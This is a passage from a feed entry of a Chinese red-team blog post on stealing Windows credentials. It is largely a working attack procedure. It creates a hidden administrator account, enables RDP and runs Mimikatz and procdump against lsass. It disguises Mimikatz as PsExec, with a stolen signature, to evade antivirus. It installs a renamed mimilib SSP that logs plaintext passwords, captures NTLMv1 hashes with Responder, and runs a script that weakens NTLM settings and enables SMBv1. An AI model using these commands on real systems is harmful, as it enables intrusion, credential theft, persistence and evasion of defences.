class="code"><pre><span class="line">:: 添加用户</span><br><span class="line"><span class="built_in">net</span> user system$ Passw0rd! /add</span><br><span class="line">:: 加入管理员组</span><br><span class="line"><span class="built_in">net</span> localgroup administrators system$ /add</span><br><span class="line">:: 开启远程登录</span><br><span class="line">reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d <span class="number">0</span> /f</span><br><span class="line">:: 查询端口</span><br><span class="line">reg query &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber</span><br></pre></td></tr></table></figure><p>又或者通过WebShell非交互式地将输出重定向到文件：</p><p><code>mimikatz.exe &quot;&quot;privilege::debug&quot;&quot; &quot;&quot;sekurlsa::logonpasswords full&quot;&quot; exit &gt;&gt; hash.txt</code></p><p>这引起了某些反病毒软件（AV）的注意，它们将<code>“mimikatz”</code>加入了特征库，也有的会拦截WebShell加系统用户的行为。这时常用的绕过技术有了两条分支，一种是对mimikatz做免杀，另一种是dump存在密钥的lsass进程。</p><h2 id="免杀Mimikatz"><a href="#免杀Mimikatz" class="headerlink" title="免杀Mimikatz"></a>免杀Mimikatz</h2><p>先聊聊对Mimikatz做免杀，反病毒软件两大主要的着力点应该就是对静态特征和动态行为的查杀了，绕过静态特征查杀的基础就是修改特征码。AV厂商（<em>怎么怪怪的</em>）自然会选取正常软件几乎没有，而恶意软件特有的东西作为特征来规避误报。无论是WebShell脚本还是恶意软件的免杀，就是伪装成正常文件逃避检测，因此定个小目标，伪装成<code>SysinternalsSuite</code>的<code>PsExec64.exe</code>。</p><p>浏览一遍源码，感觉可能被用作特征码的字段有这些：</p><p><img src="/img/winkeyqqa_a.png"></p><p>批量将其改为psexec、pslib等，并修复头文件引用。</p><p>项目中的<code>*.rc</code>文件标识着程序元信息：</p><p><img src="/img/winkeyqqa_b.png"></p><p>查看PsExec64.exe的元信息会因为窗口大小被遮挡一部分（无法调整窗口大小），一些括号等特殊符号肉眼也无法区分是半角还是全角、周围有没有空格，手敲模仿不但累还容易敲错。</p><p><img src="/img/winkeyqqa_c.png"></p><p>可以利用<a href="https://github.com/Dijji/FileMeta">FileMeta</a>项目将exe文件元信息设置为可编辑，复制后替换Mimikatz的元信息。</p><p><img src="/img/winkeyqqa_d.png"></p><p>mimilib子项目加载Dll后会生成log记录文件：</p><p><img src="/img/winkeyqqa_e.png"></p><p>通常会将mimilib.dll放在system32路径下，出现log文件显然不正常，同时注意到文件写入均为追加模式，我们将这些<code>*.log</code>文件批量替换为<code>msgsm64.acm</code>用于伪装。</p><p>编译完成后利用<a href="https://github.com/secretsquirrel/SigThief">SigThief</a>项目给生成的exe和dll加上<code>PsExec64.exe</code>的证书，强行偷来的证书校验自然是对不上的，目前某些杀软可能是出于 性能 / 误报 考虑，似乎并未对白签名证书程序进行校验。</p><p><img src="/img/winkeyqqa_f.png"></p><p>也可通过PowerSploit的<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/ScriptModification/Out-EncryptedScript.ps1">Out-EncryptedScript</a>脚本，生成加密的<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1">Invoke-Mimikatz</a>绕过AV。</p><ul><li>绕过行为特征查杀目前已有多种内存申请、进程注入、规避敏感接口等等方法，但这不是本文的重点之后有缘再聊。</li></ul><h2 id="进程dump"><a href="#进程dump" class="headerlink" title="进程dump"></a>进程dump</h2><p>静态免杀能过动态行为不一定能过，上面纯属耍小聪明运气好罢了，Mimikatz本身调用了大量WinAPI，改起来有亿点门槛。在网络环境好的情况下，可以dump出lsass进程并将内存dump文件下载回本地读取：</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">procdump64.exe -accepteula -ma lsass.exe lsass.dmp</span><br><span class="line">mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; <span class="keyword">exit</span></span><br></pre></td></tr></table></figure><p>起初可以用各种工具Dump lsass进程，后来一般只有<code>SysinternalsSuite</code>的<code>procdump</code>才不会告警了。</p><ul><li>GUI环境下也可以利用任务管理器等程序</li></ul><h2 id="AddSecurityPackage"><a href="#AddSecurityPackage" class="headerlink" title="AddSecurityPackage"></a>AddSecurityPackage</h2><p>虽然部分杀软对procdump不告警，但在网络环境恶劣的内网还是相当不友好，再如果碰上有卡巴斯基的机器更是直接嗝屁：</p><p><img src="/img/winkeyqqa_g.png"></p><p>至此我们需要了解一个叫SSP（Security Support Provider）的东西，它是SSPI（Security Support Provider Interface）这个Windows认证API的具体dll实现，通过<code>EnumerateSecurityPackages</code>接口可以枚举出已加载的SSP。mimilib.dll就具备SSP的功能，需要在注册表中添加Dll路径并调用<a href="https://docs.microsoft.com/en-us/windows/win32/api/sspi/nf-sspi-addsecuritypackagea">AddSecurityPackage API</a>加载SSP（或者重启）：</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; /v &quot;Security Packages&quot; /t REG_MULTI_SZ /d &quot;pslib64.dll&quot; /f</span><br></pre></td></tr></table></figure><p><img src="/img/winkeyqqa_h.png"></p><ul><li>放在System32目录的pslib64.dll为免杀的mimilib.dll，图中伪装为<code>DPA SSP</code></li></ul><p>发生锁屏登录或是runas等认证行为后，会将明文密码记录在System32下的<code>msgsm64.acm</code>中（默认在kiwissp.log）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[00000000:000003e7] [00000002] WORKGROUP\WIN2019$ (WIN2019$)</span><br><span class="line">[00000000:0000b1bd] [00000002] WORKGROUP\WIN2019$ (UMFD-0)</span><br><span class="line">[00000000:0000b1dd] [00000002] WORKGROUP\WIN2019$ (UMFD-1)</span><br><span class="line">[00000000:000003e4] [00000005] WORKGROUP\WIN2019$ (NETWORK SERVICE)</span><br><span class="line">[00000000:000108e8] [00000002] WORKGROUP\WIN2019$ (DWM-1)</span><br><span class="line">[00000000:00010927] [00000002] WORKGROUP\WIN2019$ (DWM-1)</span><br><span class="line">[00000000:000003e5] [00000005] \ (LOCAL SERVICE)</span><br><span class="line">[00000000:000205d2] [00000002] WIN2019\ryan (ryan)toor</span><br><span class="line">[00000000:0002064b] [00000002] WIN2019\ryan (ryan)toor</span><br></pre></td></tr></table></figure><p>这样做好处就是能扒到明文密码、会进行持久化更新和记录，坏处就是Dll要免杀、有时候也并不一定要持久化或是拿到明文密码才行，并且需要修改注册表、调用<code>AddSecurityPackage API</code>、可被<code>EnumerateSecurityPackages API</code>枚举查看、还要等一个有缘人触发登录行为。</p><p>很多时候会有点得不偿失，于是XPN在对<code>Mimikatz</code>和<code>Secur32.dll</code>跟进深入分析后，发现了以下几个要点：</p><ol><li><p>WDigest会调用SpAcceptCredentials缓存凭据</p></li><li><p>Mimilib在明文凭据传入调用后将其保存到文件里</p></li><li><p>MemSSP搜索lsass进程中的<code>msv1_0.dll</code>，通过<code>WriteProcessMemory</code> Hook <code>SpAcceptCredentials</code></p></li><li><p><code>AddSecurityPackage API</code>会通过<code>SspirCallRpc</code>调用<code>lsass</code>，通知<code>lsass</code>加载SSP</p></li></ol><p>在<a href="https://gist.github.com/xpn/c7f6d15bf15750eae3ec349e7ec2380e">Github Gist</a>有不使用<code>AddSecurityPackage API</code>加载Dll的代码，咱们对其稍作修改：</p><ol><li><p>引入静态链接库<code>#pragma comment(lib, &quot;Rpcrt4.lib&quot;)</code></p></li><li><p>修改工程字符集为<code>Use Multi-Byte Character Set</code></p></li></ol><p><img src="/img/winkeyqqa_i.png"></p><ol start="3"><li>为了用起来方便，将原本的绝对路径加载Dll改为相对相对路径加载（可以用判断目录等方式实现兼容绝对路径和相对路径，但懒得搞感觉不是很必要）</li></ol><p><img src="/img/winkeyqqa_j.png"></p><ol start="4"><li>最后整一个查找lsass进程并Dump内存的Dll：</li></ol><p><img src="/img/winkeyqqa_l.png"></p><ol start="5"><li>利用RPC调用lsass加载Dll并Dump自身内存：</li></ol><p><img src="/img/winkeyqqa_m.png"></p><p>好处是无需修改注册表、枚举SSP查不到，坏处是网络环境恶劣时不方便将Dump文件下载回来，所以也可以考虑用XPN公布的<a href="https://gist.github.com/xpn/93f2b75bf086baf2c388b2ddd50fb5d0">memssp版Dll</a>。</p><h2 id="Net-NTLMv1"><a href="#Net-NTLMv1" class="headerlink" title="Net-NTLMv1"></a>Net-NTLMv1</h2><p>为了缓解内存中WDigest的明文密码泄漏，微软发布了KB2871997（当然这个补丁作用不止于此），会在登录后将明文缓存清除掉，并且限制本地Administrator（RID 500）和本地管理员组的域用户之外的用户进行PTH（比如本地管理员组的其它用户不行）。</p><p>PassTheHash（PTH）通常是指利用NTLM哈希完成Windows身份认证这一类行为，具体可通过<code>mimikatz</code>、<code>psexec</code>、<code>smbexec</code>、<code>atexec</code>、<code>wmiexec</code>、<code>dcomexec</code>、<code>WinRM</code>等等实现。但我们不妨思考一下，为什么可以不需要明文密码？</p><p>Web应用通常是服务端收到HTTP/S传输来的明文密码（当然也有会前端加密的），在<strong>服务端</strong>对明文密码哈希计算并与数据库中存储的密码哈希比对，所以得到密码哈希后，需要由彩虹表查出明文密码才能登录。但NTLM身份认证是由<strong>客户端</strong>将用户输入的明文密码转化为NTLM哈希并加密为Net-NTLM后再由SMB、HTTP等协议传输，这就是为什么很多时候并不需要明文密码。</p><p>LM哈希（LAN Manager Hash）是NT5系列操作系统的密码默认加密方式，将明文规则变换后进行DES加密。实现方式使其可加密的最大长度为14、无法区分大小写、密文强度不高。</p><p><img src="/img/winkeyqqa_n.png"></p><p>随后微软设计了基于challenge/response机制的NTLM（NT LAN Manage)身份验证协议，从NT6操作系统开始将NTLM Hash作为密码默认加密方式。</p><p><img src="/img/winkeyqqa_o.png"></p><ol><li><p>在进行身份认证的过程中，客户端会以NTLM哈希作为密钥，通过3DES（NTLMv1）/ HMAC-MD5（NTLMv2）算法加密服务端发来的challenge，进行规则变换后最终得到net-ntlm哈希。</p></li><li><p>服务端取出密码库里存的NTLM哈希，以同样的算法加密challenge，比对客户端发来的net-ntlm哈希判断密码是否正确。</p></li><li><p>如果是域环境则密码库可能不在同一个服务端（在域控上），此时服务端会由Pass Through Authentication机制，通过netlogon协议向域控转发客户端信息。</p></li></ol><p><img src="/img/winkeyqqa_p.png"></p><p>其中NTLMv1根据有无<code>Client Challenge</code>参与，可分为第一种Net-NTLMv1哈希和另一种Net-NTLMv1-SSP哈希。而第一种Net-NTLMv1哈希因实现方式的问题，导致可以设置一个固定的<code>Sever Challenge</code>（1122334455667788）建立<a href="https://github.com/lgandx/Responder">Rogue Server</a>，在目标系统向我们建立的恶意服务器发起SMB请求（最简单的就是访问一个UNC路径<code>\\1.1.1.1</code>），通过<a href="https://crack.sh/get-cracking/">彩虹表</a>可查到解密后的NTLM哈希。</p><p><code>sudo ./Responder.py -I wlp2s0 -wrfv --lm</code></p><p><img src="/img/winkeyqqa_q.png"></p><p>这样就可不对Lsass进程毛手毛脚就获取到NTLM哈希，当然也可以尝试更进一步通过彩虹表查出NTLM哈希对应的明文密码。</p><p><img src="/img/winkeyqqa_k.png"></p><p>不过实际利用中可能会出现这种情况：</p><p><img src="/img/winkeyqqa_r.png"></p><p>这是因为<a href="https://docs.microsoft.com/en-us/windows-server/storage/file-server/troubleshoot/smbv1-not-installed-by-default-in-windows">高版本</a>的Windows服务器上可能不存在SMBv1客户端，其次LMCompatibilityLevel的值也会有影响。可以利用PowerShell修改注册表并安装SMBv1客户端，<strong>注意会导致系统重启！</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Set-Relay</span></span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment"># LMCompatibilityLevel</span></span><br><span class="line">reg add <span class="string">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Lsa\&quot;</span> /v lmcompatibilitylevel /t REG_DWORD /d <span class="number">2</span> /f</span><br><span class="line"><span class="comment"># NTLMMinClientSec</span></span><br><span class="line">reg add <span class="string">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0\&quot;</span> /v NtlmMinClientSec /t REG_DWORD /d <span class="number">536870912</span> /f</span><br><span class="line"><span class="comment"># RestrictSendingNTLMTraffic</span></span><br><span class="line">reg add <span class="string">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0\&quot;</span> /v RestrictSendingNTLMTraffic /t REG_DWORD /d <span class="number">0</span> /f</span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable SMBv1</span></span><br><span class="line"><span class="built_in">Enable-WindowsOptionalFeature</span> <span class="literal">-Online</span> <span class="literal">-FeatureName</span> smb1protocol</span><br><span class="line"><span class="comment"># DisableLoopbackCheck</span></span><br><span class="line">reg add <span class="string">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\&quot;</span> /v LsaDisableLoopbackCheck /t REG_DWORD /d <span class="number">1</span> /f</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Set-Relay</span></span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.xpnsec.com/exploring-mimikatz-part-2/">Exploring Mimikatz - Part 2 - SSP</a></p><p><a href="https://3gstudent.github.io/3gstudent.github.io/Mimikatz%E4%B8%ADSSP%E7%9A%84%E4%BD%BF%E7%94%A8/">Mimikatz中SSP的使用</a></p><p><a href="https://blog.ateam.qianxin.com/post/zhe-shi-yi-pian-bu-yi-yang-de-zhen-shi-shen-tou-ce-shi-an-li-fen-xi-wen-zhang/#44-%E5%8D%A1%E5%B7%B4%E6%96%AF%E5%9F%BA%E7%9A%84%E5%AF%B9%E6%8A%97">这是一篇“不一样”的真实渗透测试案例分析文章</a></p><p><a href="https://mp.weixin.qq.com/s/K-gA9UOyjT7y51ZqmHGnNw">dump lass 工具</a></p><p><a href="https://www.mrwu.red/web/2000.html">通过Windows蓝屏文件来绕过kaspersky的内存保护抓密码</a></p><p><a href="https://www.sans.org/blog/protecting-privileged-domain-accounts-network-authentication-in-depth/">Protecting Privileged Domain Accounts: Network Authentication In-Depth</a></p><p><a href="https://daiker.gitbook.io/windows-protocol/ntlm-pian/6#1-netntlm-v1-de-po-jie">Net-NTLM v1 的破解</a></p><p><a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-lan-manager-authentication-level">Network security: LAN Manager authentication level</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;em&gt;管中窥豹，可见一斑。Windows密钥窃取防护与绕过技术的背后，是红蓝对抗大环境的更新迭代。–hosch3n瞎编的&lt;/em&gt; &lt;/p&gt;
&lt;h2 id=&quot;Mimikatz非交互执行&quot;&gt;&lt;a href=&quot;#Mimikatz非交互执行&quot; class=&quot;headerlink</summary>
      
    
    
    
    <category term="红蓝对抗" scheme="https://hosch3n.github.io/categories/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/"/>
    
    
    <category term="mimikatz" scheme="https://hosch3n.github.io/tags/mimikatz/"/>
    
    <category term="mimilib" scheme="https://hosch3n.github.io/tags/mimilib/"/>
    
    <category term="SSP" scheme="https://hosch3n.github.io/tags/SSP/"/>
    
    <category term="NTLM" scheme="https://hosch3n.github.io/tags/NTLM/"/>
    
    <category term="relay" scheme="https://hosch3n.github.io/tags/relay/"/>
    
  </entry>
  
</feed>
